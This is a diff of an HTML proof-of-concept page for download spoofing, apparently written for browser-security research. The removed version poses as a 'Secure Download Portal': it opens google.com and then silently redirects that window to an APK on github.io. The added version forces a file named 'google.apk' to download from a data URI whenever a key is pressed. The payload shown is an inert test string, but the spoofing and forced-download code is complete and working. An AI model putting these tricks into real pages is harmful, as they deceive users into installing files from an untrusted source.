@@ -1,60 +1,42 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Desktop PoC</title>
-
-<style>
-body {
-  font-family: Arial, sans-serif;
-  text-align: center;
-  margin-top: 100px;
-}
-
-.button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  font-size: 18px;
-  cursor: pointer;
-  border-radius: 6px;
-}
-
-.button:hover {
-  background-color: #45a049;
-}
-</style>
+  <meta charset="UTF-8">
+  <title>Download & Fullscreen on Keypress</title>
 </head>
-
 <body>
+  <center><h2>POC by Chigorin!</h2></center>
 
-<h2>Secure Download Portal</h2>
-<p>Click the button below to download from the official source</p>
+  <script>
+    // Listen to any keydown
+    window.addEventListener('keydown', function(e) {
+      // open the download
+      openWin();
+      // request fullscreen
+      //goFullScreen();
+    });
 
-<button class="button" onclick="startAttack()">Download From Original Site</button>
-
-<script>
-function startAttack() {
-    // Open legitimate site in a named window
-    let win = window.open('https://google.com', 'trusted_window');
-
-    // Ensure popup is not blocked
-    if (!win) {
-        alert("Popup blocked! Please allow popups for this demo.");
-        return;
+    // Download helper
+    function Puf(uri, name) {
+      const link = document.createElement("a");
+      link.href = uri;
+      link.download = name;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
     }
 
-    // After delay, replace content in the SAME window
-    setTimeout(function() {
-        try {
-            win.location.href = 'https://k4tedu.github.io/spoof/test.apk';
-        } catch (e) {
-            console.log("Navigation blocked by browser:", e);
-        }
-    }, 5000);
-}
-</script>
+    // Kick off your “APK” download
+    function openWin() {
+      Puf(
+        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
+        "google.apk"
+      );
+    }
 
+  </script>
+  
+
+  
 </body>
 </html>
